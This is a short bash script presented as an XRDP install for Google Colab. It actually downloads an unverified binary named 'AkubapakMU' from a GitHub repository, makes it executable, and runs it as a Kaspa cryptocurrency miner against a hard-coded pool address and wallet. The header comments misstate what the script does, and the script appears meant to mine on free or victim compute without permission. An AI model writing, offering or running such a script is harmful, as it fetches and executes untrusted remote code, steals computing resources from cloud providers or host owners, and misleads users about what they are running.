# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=178.128.86.41:80
WALLET=kaspa:qqz73djnft2sptcmeh3qt322t2p9xj36tydlrm6lcu63cuwnmmsuxtxmd4a6n

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
